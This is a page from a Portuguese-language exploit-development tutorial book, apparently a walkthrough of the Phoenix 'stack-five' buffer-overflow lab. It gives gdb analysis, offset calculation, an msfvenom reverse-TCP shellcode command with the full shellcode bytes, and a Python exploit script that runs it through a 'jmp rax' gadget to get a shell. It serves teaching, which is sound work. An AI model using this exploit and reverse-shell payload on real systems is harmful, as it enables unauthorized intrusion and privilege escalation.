<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Stack Five - Um Livrinho Sobre Exploit Dev</title>
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <base href="../../">

        <link rel="stylesheet" href="book.css">
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel="stylesheet" type="text/css">

        <link rel="shortcut icon" href="favicon.png">

        <!-- Font Awesome -->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">

        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme -->
        

        

        <!-- Fetch Clipboard.js from CDN but have a local fallback -->
        <script src="https://cdn.jsdelivr.net/clipboard.js/1.6.1/clipboard.min.js"></script>
        <script>
            if (typeof Clipboard == 'undefined') {
                document.write(unescape("%3Cscript src='clipboard.min.js'%3E%3C/script%3E"));
            }
        </script>

        <!-- Fetch JQuery from CDN but have a local fallback -->
        <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
        <script>
            if (typeof jQuery == 'undefined') {
                document.write(unescape("%3Cscript src='jquery.js'%3E%3C/script%3E"));
            }
        </script>

        <!-- Fetch store.js from local - TODO add CDN when 2.x.x is available on cdnjs -->
        <script src="store.js"></script>

    </head>
    <body class="light">
        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme = store.get('mdbook-theme');
            if (theme === null || theme === undefined) { theme = 'light'; }
            $('body').removeClass().addClass(theme);
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var sidebar = store.get('mdbook-sidebar');
            if (sidebar === "hidden") { $("html").addClass("sidebar-hidden") }
            else if (sidebar === "visible") { $("html").addClass("sidebar-visible") }
        </script>

        <div id="sidebar" class="sidebar">
            <ul class="chapter"><li><a href="./mapa.html"><strong>1.</strong> Mapa</a></li><li class="spacer"></li><li><a href="./stack/phoenix/setup.html"><strong>2.</strong> Phoenix Stack</a></li><li><ul class="section"><li><a href="./stack/phoenix/StackZero.html"><strong>2.1.</strong> Stack Zero</a></li><li><a href="./stack/phoenix/StackOne.html"><strong>2.2.</strong> Stack One</a></li><li><a href="./stack/phoenix/StackTwo.html"><strong>2.3.</strong> Stack Two</a></li><li><a href="./stack/phoenix/StackThree.html"><strong>2.4.</strong> Stack Three</a></li><li><a href="./stack/phoenix/StackFour.html"><strong>2.5.</strong> Stack Four</a></li><li><a href="./stack/phoenix/StackFive.html" class="active"><strong>2.6.</strong> Stack Five</a></li><li><a href="./stack/phoenix/StackSix.html"><strong>2.7.</strong> Stack Six</a></li></ul></li><li><strong>3.</strong> Estilo OSCP</li><li><ul class="section"><li><strong>3.1.</strong> Brainpan</li><li><strong>3.2.</strong> Tib3rius BOF Prep</li></ul></li><li><a href="./stack/mitigacoes.html"><strong>4.</strong> Mitiga√ß√µes</a></li><li><strong>5.</strong> from pwn import *</li><li><a href="./stack/ret2libc/intro.html"><strong>6.</strong> Ret2LibC</a></li><li><ul class="section"><li><strong>6.1.</strong> Protostar Stack Six: ret2libc</li><li><strong>6.2.</strong> Avan√ßado: M√∫ltiplos ret2libc</li></ul></li><li><a href="./stack/rop/intro.html"><strong>7.</strong> ROP</a></li><li><ul class="section"><li><a href="./stack/rop/primitivos.html"><strong>7.1.</strong> Primitivos</a></li><li><ul class="section"><li><a href="./stack/rop/ROPE/dump.html"><strong>7.1.1.</strong> ROPE</a></li></ul></li><li><strong>7.2.</strong> Pivot</li><li><ul class="section"><li><strong>7.2.1.</strong> ROPE: pivot</li></ul></li><li><strong>7.3.</strong> ROP + ret2libc</li><li><a href="./stack/rop/SROP/SROP.html"><strong>7.4.</strong> SROP</a></li><li><ul class="section"><li><strong>7.4.1.</strong> Sem Leaks</li></ul></li></ul></li><li><strong>8.</strong> Derrotando ASLR</li><li><strong>9.</strong> Derrotando Canaries</li><li class="spacer"></li><li><strong>10.</strong> Teoria</li><li><strong>11.</strong> B√°sico</li><li><ul class="section"><li><strong>11.1.</strong> Fastbins Dup</li><li><a href="./heap/basico/HouseOfForce.html"><strong>11.2.</strong> House of Force</a></li><li><strong>11.3.</strong> Unsafe Unlink</li><li><strong>11.4.</strong> Safe Unlink</li><li><strong>11.5.</strong> Unsorted bins: Partial Unlink</li><li><strong>11.6.</strong> Chunk Faking</li></ul></li><li><strong>12.</strong> Intermedi√°rio</li><li><ul class="section"><li><strong>12.1.</strong> House of Orange</li><li><ul class="section"><li><strong>12.1.1.</strong> Heap Extension</li><li><strong>12.1.2.</strong> Vtable + File Stream Exploitation</li><li><strong>12.1.3.</strong> Unindo tudo isso!</li></ul></li><li><strong>12.2.</strong> House of Spirit</li></ul></li><li><strong>13.</strong> Avan√ßado</li><li><ul class="section"><li><strong>13.1.</strong> House of Rust</li><li class="spacer"></li></ul></li><li><strong>14.</strong> Intro AFL</li></ul>
        </div>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page" tabindex="-1">
                
                <div id="menu-bar" class="menu-bar">
                    <div class="left-buttons">
                        <i id="sidebar-toggle" class="fa fa-bars" title="Toggle sidebar"></i>
                        <i id="theme-toggle" class="fa fa-paint-brush" title="Change theme"></i>
                    </div>

                    <h1 class="menu-title">Um Livrinho Sobre Exploit Dev</h1>

                    <div class="right-buttons">
                        <a href="print.html">
                            <i id="print-button" class="fa fa-print" title="Print this book"></i>
                        </a>
                    </div>
                </div>

                <div id="content" class="content">
                    <ul>
<li><a href="./stack/phoenix/StackFive.html#-objetivo">üéØ Objetivo</a></li>
<li><a href="./stack/phoenix/StackFive.html#-dicas">üí° Dicas</a></li>
<li><a href="./stack/phoenix/StackFive.html#-exploit">üî• Exploit</a>
<ul>
<li><a href="./stack/phoenix/StackFive.html#analisando-o-programa">Analisando o programa</a></li>
<li><a href="./stack/phoenix/StackFive.html#agora-em-asm-d-analise-est%C3%A1tica">Agora em ASM :D (analise est√°tica)</a>
<ul>
<li><a href="./stack/phoenix/StackFive.html#breakpoint">Breakpoint</a></li>
</ul>
</li>
<li><a href="./stack/phoenix/StackFive.html#agora-vamos-executar-o-programa-analise-din%C3%A2mica">Agora vamos executar o programa (analise din√¢mica)</a></li>
<li><a href="./stack/phoenix/StackFive.html#encontrar-endere%C3%A7o-do-buffer">Encontrar endere√ßo do buffer</a></li>
<li><a href="./stack/phoenix/StackFive.html#nop-sled">NOP sled</a></li>
<li><a href="./stack/phoenix/StackFive.html#shellcode">Shellcode</a></li>
<li><a href="./stack/phoenix/StackFive.html#corrigindo-o-problema">Corrigindo o problema</a>
<ul>
<li><a href="./stack/phoenix/StackFive.html#rop-gadgets">ROP Gadgets</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="./stack/phoenix/StackFive.html#-solu%C3%A7%C3%A3o">üí´ Solu√ß√£o</a></li>
</ul>
<a class="header" href="./stack/phoenix/StackFive.html#-objetivo" id="-objetivo"><h1>üéØ Objetivo</h1></a>
<p>Finalmente! Tudo isso para chegar no BOF SRP (cl√°ssico) :D</p>
<p>Agora ta na hora de redirecionar o pointer para o nosso c√≥digo malicioso (shellcode) para ganhar uma shell</p>
<a class="header" href="./stack/phoenix/StackFive.html#-dicas" id="-dicas"><h1>üí° Dicas</h1></a>
<p>A instru√ß√£o <code>0xCC</code> (<code>int3</code>) serve para no debugger (como o gdb), para quando o rip chegar nela, a execu√ß√£o pausar (<code>breakpoint</code>). Nos podemos usa-la para testar se
sequer conseguimos executar c√≥digo, ou se o problema ta no shellcode: Se o debugger avisa que teve <code>SIGTRAP</code>, nos temos execu√ß√£o de c√≥digo :D</p>
<p>Banco de dados de shellcode: <a href="http://shell-storm.org/shellcode/files/">shell-storm</a></p>
<a class="header" href="./stack/phoenix/StackFive.html#-exploit" id="-exploit"><h1>üî• Exploit</h1></a>
<a class="header" href="./stack/phoenix/StackFive.html#analisando-o-programa" id="analisando-o-programa"><h2>Analisando o programa</h2></a>
<p><code>main()</code> printa o banner e chama <code>start_level()</code></p>
<p><code>start_level()</code> cria um buffer[<strong>128</strong>] e salva o output de <code>gets()</code> (<strong>inseguro</strong>)</p>
<p>Como voc√™ pode ver, n√£o existe <code>complete_level()</code></p>
<p>Para completar, precisamos executar nosso pr√≥prio c√≥digo (<code>shellcode</code>) e conseguir uma shell (uma linha de comando)</p>
<a class="header" href="./stack/phoenix/StackFive.html#agora-em-asm-d-analise-est√°tica" id="agora-em-asm-d-analise-est√°tica"><h2>Agora em ASM :D (analise est√°tica)</h2></a>
<p>Normalmente, o gdb printa assim:</p>
<pre><code class="language-x86asm">   0x00000000004005a4 &lt;+0&gt;:	push   rbp
   0x00000000004005a5 &lt;+1&gt;:	mov    rbp,rsp
   0x00000000004005a8 &lt;+4&gt;:	sub    rsp,0x10
</code></pre>
<p>Porem, eu removi os endere√ßos para simplificar, e s√≥ mantive os importantes!</p>
<p>Primeiro, vamos ver main</p>
<pre><code class="language-x86asm">gef&gt; disassemble main
push   rbp
mov    rbp,rsp                    &lt;- Prologo
sub    rsp,0x10
   
   
mov    DWORD PTR [rbp-0x4],edi
mov    QWORD PTR [rbp-0x10],rsi   &lt;- args de puts
mov    edi,0x400620
call   0x400400 &lt;puts@plt&gt;        &lt;- call puts
   
   
mov    eax,0x0                    &lt;- args de start_level (nenhum)
call   0x40058d &lt;start_level&gt;     &lt;- call start_level
   
   
mov    eax,0x0                    &lt;- exit code (c√≥digo de saida, 0=sem erro)
leave                             &lt;- Epilogo  
</code></pre>
<p>Agora vamos ver start_level</p>
<pre><code class="language-x86asm">gef&gt; disassemble start_level 
push   rbp
mov    rbp,rsp                  &lt;- Prologo 
add    rsp,0xffffffffffffff80   
                                
   
lea    rax,[rbp-0x80]         &lt;- rax = Pointer para buffer[128]
mov    rdi,rax                &lt;- rdi = rax

0x000000000040059c &lt;+15&gt;:
call   0x4003f0 &lt;gets@plt&gt;    &lt;- call gets


nop
leave                         &lt;- Epilogo
ret
</code></pre>
<p>Agora vamos adicionar um breakpoint!</p>
<a class="header" href="./stack/phoenix/StackFive.html#breakpoint" id="breakpoint"><h3>Breakpoint</h3></a>
<blockquote>
<p>Breakpoint = ponto de pausa</p>
</blockquote>
<p>Antes daquela intrus√£o ser executada, sera substitu√≠da por <code>0xCC</code>. Isso faz o  debugger pausar a execu√ß√£o do programa naquela instru√ß√£o!</p>
<p>Quando continuamos executando (normalmente o comando √© <strong>continue</strong>), o <code>0xCC</code> √© substitu√≠do pela instru√ß√£o certa :D</p>
<p>Se voc√™ esta fora de um debugger, <code>0xCC</code> vai fazer o programa sair com erro</p>
<pre><code class="language-x86asm">gef&gt; b *0x000000000040059c
Breakpoint 1 at 0x40059c
</code></pre>
<p>&quot;b&quot; √© o comando do gdb para adicionar um breakpoint \
A &quot;*&quot; tem haver com aquele dos pointers \
O endere√ßo √© para &quot;<code>call gets</code>&quot;</p>
<blockquote>
<p>Dica: se voc√™ selecionar/sublinhar (clique esquerdo e passa o mouse em cima, voc√™ sabe do que eu to falando), e clicar o bot√£o do meio no mouse (a rodinha)
o terminal automaticamente da Ctrl-C Ctrl-V naquele valor para voc√™! Ent√£o n√£o precisa copiar o endere√ßo manualmente :D</p>
</blockquote>
<a class="header" href="./stack/phoenix/StackFive.html#agora-vamos-executar-o-programa-analise-din√¢mica" id="agora-vamos-executar-o-programa-analise-din√¢mica"><h2>Agora vamos executar o programa (analise din√¢mica)</h2></a>
<p>126 As n√£o causam erro, e 127 As causam... ue, mas pq? n√£o era pra dar erro s√≥ em 128?</p>
<pre><code class="language-bash">$ python3 -c &quot;print('A'*126)&quot; | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education

$ python3 -c &quot;print('A'*127)&quot; | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Segmentation fault
</code></pre>
<p>Isso vai ser muito importante no pr√≥ximo desafio: buffers s√£o terminados com um null byte!</p>
<p>Por enquanto, isso s√≥ nos mostra que o compilador n√£o adicionou nada no meio do caminho entre o buffer e o EBP+EIP Salvos :D</p>
<p>E n√≥s ja sabemos como controlar o EIP, ent√£o agora s√≥ precisamos saber para onde redirecionar a execu√ß√£o :)</p>
<a class="header" href="./stack/phoenix/StackFive.html#encontrar-endere√ßo-do-buffer" id="encontrar-endere√ßo-do-buffer"><h2>Encontrar endere√ßo do buffer</h2></a>
<p>Agora dentro do gdb (<strong>gdb stack-five</strong>)</p>
<blockquote>
<p>gef&gt; r &lt;&lt;&lt; $(python3 -c &quot;print('A'<em>100)&quot;)</em>*7fff....</p>
</blockquote>
<p>stack
<img src="./img/stack_five/before_gets_2.png" alt="" /></p>
<p>Voc√™ tamb√©m acha que tem uma falta de AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ?? hehehe :P</p>
<p>(((Insira aquele meme muito velho da cabra gritando)))</p>
<p>Ent√£o vamos avan√ßar para pr√≥xima instru√ß√£o (step: <code>s</code>) :D
<img src="./img/stack_five/gef_after_gets_0.png" alt="" /></p>
<p>Isso quer dizer que aquele pointer dos argumentos (RDI) agora aponta para os As! :D</p>
<pre><code class="language-x86asm">gef&gt; x/s 0x00007fffffffe5b0              -&gt; x/s √© o comando para printar strings
0x7fffffffe5b0:	'A' &lt;repete 140 vezes&gt;
</code></pre>
<p>Ent√£o nos ja temos o endere√ßo dos nossos As :D ... que em breve ser√£o shellcode :D</p>
<p>Mas agora precisamos saber com precis√£o quantos As at√© o RIP, <code>info frame</code> vai nos ajudar com isso:</p>
<pre><code class="language-x86asm">gef&gt; info frame
Stack level 0, frame at 0x7fffffffe640:
 rip = 0x4005a1 in start_level  saved rip = 0x4005c7
 called by frame at 0x7fffffffe610
 Arglist at 0x7fffffffe630, args: 
 Locals at 0x7fffffffe630, Previous frame's sp is 0x7fffffffe640
 Saved registers:
  rbp at 0x7fffffffe630, rip at 0x7fffffffe638
</code></pre>
<p>A ultima linha √© a mais importante!</p>
<p>RIP em: <code>0x7fffffffe638</code></p>
<p>Ent√£o para encontrar precisamente quantos As precisamos colocar at√© chegarmos no RIP,
basta subtrair <code>endere√ßo do rip salvo - endere√ßo dos As</code></p>
<pre><code class="language-x86asm">$ python3
&gt;&gt;&gt; 0x7fffffffe638 - 0x00007fffffffe5b0
136
</code></pre>
<p>Para confirmar isso, vamos rodar com 136 As + BBBB</p>
<p><img src="./img/stack_five/gef_136A_BBBB.png" alt="" /></p>
<p>RIP = BBBB (42424242) :D</p>
<a class="header" href="./stack/phoenix/StackFive.html#nop-sled" id="nop-sled"><h2>NOP sled</h2></a>
<p>Entretanto, como nada pode ser simples nesse mundo do desenvolvimento de exploits, n√≥s n√£o conseguimos saber com precis√£o que o buffer vai estar naquela localiza√ß√£o :(</p>
<p>Isso ocorre pois as envs s√£o alocadas na stack. E elas variam muito, por exemplo, s√≥ de mudar o local de onde o programa esta sendo executado quebraria o nosso exploit.</p>
<blockquote>
<p>Dica: O gef pode nos ajudar a encontra-las
<img src="./img/stack_five/gef_envs_1.png" alt="" /></p>
</blockquote>
<p>Por exemplo:</p>
<p><img src="./img/stack_five/gef_envs_0.png" alt="" /></p>
<p>Para remediar isso, podemos usar um NOP sled (ou NOP slide) ! :D</p>
<p>(Outro m√©todo de remedia√ß√£o √© mencionado em <code>stack-six</code>)</p>
<p>NOP significa &quot;<strong>No</strong> <strong>OP</strong>eration&quot; (<strong>N</strong>enhuma <strong>OP</strong>era√ß√£o) ! √© uma instru√ß√£o que n√£o faz nada :D</p>
<p>A representa√ß√£o em machine code do NOP √© <code>0x90</code> :D Bem f√°cil de decorar, quem me dera escola fosse f√°cil assim hehehe :)</p>
<p>O processador vai fazer nada e passar para a pr√≥xima, e se n√≥s colocarmos v√°rios desses em sequencia, o RIP vai &quot;deslizando&quot; atrav√©s at√© chegar no nosso c√≥digo!</p>
<p>Voc√™ pode imaginar um escorregador :D yuuuuupiii</p>
<p><img src="./img/panda_slide_1.gif" alt="" /></p>
<p>Ent√£o a gente redireciona o RIP para o meio do escorregador de NOPs, para ele deslizar at√© o nosso c√≥digo :D</p>
<p>Assim, mesmo se o buffer estiverem em um endere√ßo diferente, o RIP vai chegar no nosso shellcode</p>
<p>Para testar isso, vamos usar o truque do <code>0xCC</code> mencionado anteriormente</p>
<p>O input que vai passar vai conter:</p>
<pre><code class="language-x86asm">NOP * 135
0xCC
Endere√ßo para ser colocado no RIP: 0x00007fffffffe5b0 + 70

70 = metade do escorregador (135)
</code></pre>
<p>E os <strong>breakpoints do gdb ser√£o removidos</strong>, ent√£o caso encontremos um breakpoint, foi o <code>0xCC</code> acima</p>
<pre><code class="language-x86asm">$ python3
&gt;&gt;&gt; hex(0x00007fffffffe5b0 + 70)
'0x7fffffffe5f6'                     - Little Endian -&gt; '\xb6\xe5\xff\xff\xff\x7f'
</code></pre>
<p>Agora executando:</p>
<pre><code class="language-x86asm">r &lt;&lt;&lt; $(python -c &quot;print '\x90' *135 + '\xcc' +'\xb6\xe5\xff\xff\xff\x7f'&quot;)
</code></pre>
<p>Nos recebemos uma SIGTRAP (chegou no breakpoint)</p>
<pre><code class="language-x86asm">[#0] Id 1, Name: &quot;stack-five&quot;, stopped, reason: SIGTRAP
</code></pre>
<p>E na se√ß√£o <code>code</code> do gef
<img src="./img/stack_five/gef_run_xCC.png" alt="" />
Meio dif√≠cil de ver, mas tem:</p>
<pre><code class="language-x86asm">NOP
NOP
INT3
(bad)
(bad)
</code></pre>
<blockquote>
<p>int3 √© o nome de 0xCC, da mesma maneira que NOP √© o nome de 0x90</p>
</blockquote>
<p>Apos a nossa ultima instru√ß√£o ha instru√ß√µes invalidas <code>(bad)</code> que eram o nosso pointer, e logo em seguida o resto do programa normal! :D</p>
<a class="header" href="./stack/phoenix/StackFive.html#shellcode" id="shellcode"><h2>Shellcode</h2></a>
<p>Shellcode √© o c√≥digo malicioso que vai ser executado ( normalmente te dando uma shell (terminal) n√£o autorizada )</p>
<p>Nos podemos usar os do link citado na dica, ou gerar uma usando <code>msfvenom</code> (ja vem instalado no kali linux)</p>
<blockquote>
<p>msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform linux -a x64 -f python --var-name buf</p>
</blockquote>
<pre><code>No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of python file: 373 bytes
buf =  b&quot;&quot;
buf += b&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += b&quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += b&quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += b&quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += b&quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += b&quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

</code></pre>
<p>Agora, vamos fazer um exploit mais bem feito! <code>vim /tmp/gerar_exploit.py</code></p>
<pre><code class="language-python">buf =  b&quot;&quot;

# shellcode
buf += b&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += b&quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += b&quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += b&quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += b&quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += b&quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# NOP Sled para completar o resto do tamanho
buf = '\x90'*(136-len(buf)) + buf

# ret
buf += b'\xb6\xe5\xff\xff\xff\x7f' 


open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<blockquote>
<p>O script /tmp/gerar_exploit.py vai gerar o que colocar√≠amos no input, mas ao inv√©s de printarmos para o terminal, vamos salvar em um arquivo bin√°rio (por isso o &quot;<code>wb</code>&quot; no <code>open</code>)!</p>
<p>Depois √© s√≥ ler esse arquivo e redireciona-lo <code>cat /tmp/exploit | ./stack-five</code></p>
</blockquote>
<p>Porem, se tentamos executar esse exploit, recebemos <code>SIGSEV: viola√ß√£o de segmento</code></p>
<a class="header" href="./stack/phoenix/StackFive.html#corrigindo-o-problema" id="corrigindo-o-problema"><h2>Corrigindo o problema</h2></a>
<p>Nessa eu empaquei, e a solu√ß√£o veio daqui: <a href="https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-five-solution/">blog lamarranet</a></p>
<p>Ent√£o valeu pela ajuda :D</p>
<p>Ao inv√©s de colocar o endere√ßo do buffer diretamente no RIP, vamos achar algo no programa original que aponte para ele: um <code>jmp esp</code> por exemplo</p>
<p>E o beneficio √© que, por estarmos pulando para uma parte est√°tica, e usando-a para redirecionar para o buffer, n√£o corremos o risco do buffer mudar de endere√ßo!</p>
<p>Isso quer dizer que n√£o precisamos mais do NOP slide :D</p>
<a class="header" href="./stack/phoenix/StackFive.html#rop-gadgets" id="rop-gadgets"><h3>ROP Gadgets</h3></a>
<p>Essa √© uma t√©cnica chamada programa√ß√£o <code>ROP</code>, que sera discutida em tutoriais futuros :D  Mas o que voc√™ precisa saber por enquanto √© que cada um desses <code>jmps</code> √© chamado de <strong>gadget</strong></p>
<p>Gadgets s√£o instru√ß√µes em outras partes do programa, que s√£o reaproveitadas por nos. Geralmente executar algo e pular para outro gadget!</p>
<p>Para achar esse jmp que nos ajudaria, podemos usar uma ferramenta chamada <code>ROPgadget</code></p>
<pre><code class="language-x86asm">$ ROPgadget --binary stack-five --only &quot;jmp&quot;
Gadgets information
============================================================
0x0000000000400481 : jmp rax

Unique gadgets found: 1
</code></pre>
<p>Isso quer dizer que, ao pular para <code>0x400481</code>, vamos executar <code>jmp rax</code> e acabar pulando para rax! e para onde rax aponta?</p>
<p>Colocando um break antes do ret de <code>start_level</code>, podemos ver que antes de retornar, rax aponta para o mesmo endere√ßo que rsp, e convenientemente o inicio do nosso buffer
<img src="./img/stack_five/gef_rax.png" alt="" /></p>
<p>rax,rdi e rsp apontam para o inicio do buffer dos As</p>
<p>Assim, n√£o vamos mais precisar do NOP slide: temos um exploit que 100% dos casos vai apontar para o inicio do buffer!</p>
<p>S√≥ precisamos colocar <code>padding</code> entre o shellcode e o RIP</p>
<p>Ent√£o vamos modificar o exploit :D</p>
<pre><code>Dica: Shellcode+AAAAA+ret, Little Endian, 136 bytes ate RIP

Se voc√™ n√£o quiser ver a solu√ß√£o enquanto tenta!
.
.
.
.
.
.
.
.
.
.
.
</code></pre>
<pre><code class="language-python">buf =  &quot;&quot;

# shellcode
buf += &quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += &quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += &quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += &quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += &quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += &quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# Padding
buf += 'A' * (136 - len(buf))

# ret
buf += '\x81\x04\x40' # Aponta para jmp rax

open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<blockquote>
<p>Eu removi o <strong>b&quot;&quot;</strong> pq tava dando problema :(</p>
</blockquote>
<p>Agora basta gerar o exploit: <code>python /tmp/gerar_exploit.py</code></p>
<p>Abrir um novo terminal: <code>ssh -p 2222 user@localhost</code></p>
<p>Terminal 1: <code>nc -lvnp 4444</code></p>
<p>Terminal 2: <code>cat /tmp/exploit | ./stack-five</code></p>
<p>Agora, no terminal 1 deve ter uma shell :D</p>
<p><img src="./img/stack_five/Exploit_working.png" alt="" /></p>
<blockquote>
<p>Dica: <code>bash -ip</code> vai deixar a sua shell mais us√°vel</p>
</blockquote>
<p>Se nos tiv√©ssemos executado o programa como root, a nossa shell teria esses privil√©gios elevados ! :D</p>
<p><img src="./img/stack_five/root_exploit.png" alt="" /></p>
<p><code>UID = 0</code> quer dizer que possu√≠mos privil√©gios de root, mesmo que o <code>whoami</code> n√£o tenha dito root</p>
<p>E se o programa estivesse exposto para a rede, poder√≠amos conseguir uma root shell remota :D (spoiler para os pr√≥ximos desafios hehehe)</p>
<hr />
<p>Voc√™ chegou at√© aqui :D</p>
<p>Toma mais um gif de panda como presente</p>
<p><img src="./img/panda_slide_0.gif" alt="" /></p>
<a class="header" href="./stack/phoenix/StackFive.html#-solu√ß√£o" id="-solu√ß√£o"><h1>üí´ Solu√ß√£o</h1></a>
<blockquote>
<p>vim /tmp/gerar_exploit.py</p>
</blockquote>
<pre><code>buf =  &quot;&quot;

# shellcode
buf += &quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += &quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += &quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += &quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += &quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += &quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# Filler
buf += 'A' * (136 - len(buf))

# ret
buf += '\x81\x04\x40' # Aponta para jmp rax

open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<p>Agora basta gerar o exploit: <code>python /tmp/gerar_exploit.py</code></p>
<p>Abrir um novo terminal: <code>ssh -p 2222 user@localhost</code></p>
<p>Terminal 1: <code>nc -lvnp 4444</code></p>
<p>Terminal 2: <code>cat /tmp/exploit | ./stack-five</code></p>
<p>Agora, no terminal 1 deve ter uma shell :D</p>

                </div>

                <!-- Mobile navigation buttons -->
                
                    <a rel="prev" href="./stack/phoenix/StackFour.html" class="mobile-nav-chapters previous" title="Previous chapter">
                        <i class="fa fa-angle-left"></i>
                    </a>
                

                
                    <a rel="next" href="./stack/phoenix/StackSix.html" class="mobile-nav-chapters next" title="Next chapter">
                        <i class="fa fa-angle-right"></i>
                    </a>
                

            </div>

            
                <a href="./stack/phoenix/StackFour.html" class="nav-chapters previous" title="You can navigate through the chapters using the arrow keys">
                    <i class="fa fa-angle-left"></i>
                </a>
            

            
                <a href="./stack/phoenix/StackSix.html" class="nav-chapters next" title="You can navigate through the chapters using the arrow keys">
                    <i class="fa fa-angle-right"></i>
                </a>
            

        </div>


        <!-- Local fallback for Font Awesome -->
        <script>
            if ($(".fa").css("font-family") !== "FontAwesome") {
                $('<link rel="stylesheet" type="text/css" href="_FontAwesome/css/font-awesome.css">').prependTo('head');
            }
        </script>

        <!-- Livereload script (if served using the cli tool) -->
        
    <script type="text/javascript">
        var socket = new WebSocket("ws://localhost:3001");
        socket.onmessage = function (event) {
            if (event.data === "reload") {
                socket.close();
                location.reload(true); // force reload from server (not from cache)
            }
        };

        window.onbeforeunload = function() {
            socket.close();
        }
    </script>


        

        

        

        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS script -->
        

    </body>
</html>
